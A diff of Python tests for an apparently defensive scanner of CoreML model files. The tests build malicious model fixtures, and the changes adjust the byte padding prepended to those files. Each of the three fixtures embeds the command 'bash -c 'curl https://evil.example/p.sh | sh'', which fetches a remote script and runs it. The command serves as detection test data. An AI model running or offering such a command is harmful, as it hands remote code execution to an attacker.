@@ -211,7 +211,7 @@ def test_selected_coreml_scanner_analyzes_budget_exhausted_renamed_candidate(tmp
         custom_class="EvilRuntimeLayer",
         custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
     )
-    model_path.write_bytes((b"\x9a\x06\x00" * 4097) + model_path.read_bytes())
+    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())
 
     result = scan_file(str(model_path), config={"scanners": ["coreml"], "cache_enabled": False})
 
@@ -226,7 +226,7 @@ def test_nested_selected_coreml_scanner_analyzes_budget_exhausted_renamed_candid
         custom_class="EvilRuntimeLayer",
         custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
     )
-    model_path.write_bytes((b"\x9a\x06\x00" * 4097) + model_path.read_bytes())
+    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())
 
     result = scan_nested_file(str(model_path), config={"scanners": ["coreml"], "cache_enabled": False})
 
@@ -241,7 +241,7 @@ def test_excluded_coreml_scanner_is_not_run_for_renamed_candidate(tmp_path: Path
         custom_class="EvilRuntimeLayer",
         custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
     )
-    model_path.write_bytes((b"\x9a\x06\x00" * 4097) + model_path.read_bytes())
+    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())
 
     result = scan_file(str(model_path), config={"exclude_scanners": ["coreml"], "cache_enabled": False})
 
